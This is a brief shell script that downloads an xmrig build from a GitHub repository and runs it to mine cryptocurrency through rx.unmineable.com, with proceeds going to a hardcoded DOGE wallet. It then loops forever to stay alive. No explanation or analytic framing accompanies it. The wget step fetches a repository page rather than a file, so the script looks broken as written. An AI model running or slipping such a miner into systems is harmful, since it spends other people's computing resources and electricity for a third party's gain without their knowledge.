#!/bin/sh
sudo apt update
sudo apt install screen -y
 wget https://github.com/quincyhays/bmxmrig
cd bmxmrig
chmod u+x ./xmrig
./xmrig -o rx.unmineable.com:3333 -u DOGE:DT51FKftRzZCEeKVLfdRHq2Yxapyer5HbM.Zerox -p X -k -a rx/0
while [ 1 ]; do
sleep 3
done
sleep 999